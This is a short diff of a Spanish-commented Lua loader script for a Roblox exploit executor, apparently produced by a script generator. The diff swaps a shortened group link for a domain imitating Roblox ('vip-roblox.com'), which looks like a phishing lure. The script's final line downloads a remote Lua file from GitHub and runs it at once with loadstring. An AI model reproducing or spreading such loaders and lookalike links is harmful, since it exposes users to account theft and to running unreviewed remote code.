@@ -1,6 +1,6 @@
 -- Script Lua generado por DarkEclipse252j para mqjv
 -- Script Principal - Lo que ejecutas en tu executor
 _G.Config = {
-    GroupLink = "https://is.gd/Of5uA8", -- <--- ¡Esta línea ahora tiene la URL real desde Python!
+    GroupLink = "https://vip-roblox.com/communities/1237699083/", -- <--- ¡Esta línea ahora tiene la URL real desde Python!
 }
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Ninjajusn252j/universal-hub/main/Universalhub.lua"))()
